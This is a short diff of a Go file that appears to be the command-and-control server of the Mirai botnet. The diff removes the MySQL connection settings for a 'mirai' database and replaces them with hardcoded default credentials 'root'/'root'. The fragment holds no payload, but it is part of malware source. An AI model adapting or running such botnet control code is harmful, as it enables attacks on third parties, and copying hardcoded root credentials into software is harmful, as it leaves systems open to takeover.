@@ -7,13 +7,10 @@ import (
 	"time"
 )
 
-const DatabaseAddr string = "127.0.0.1:3306"
-const DatabaseUser string = "root"
-const DatabasePass string = "root"
-const DatabaseTable string = "mirai"
+const DefaultUser string = "root"
+const DefaultPass string = "root"
 
 var clientList *ClientList = NewClientList()
-var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)
 
 func main() {
 	fmt.Println("[CNC] Start")
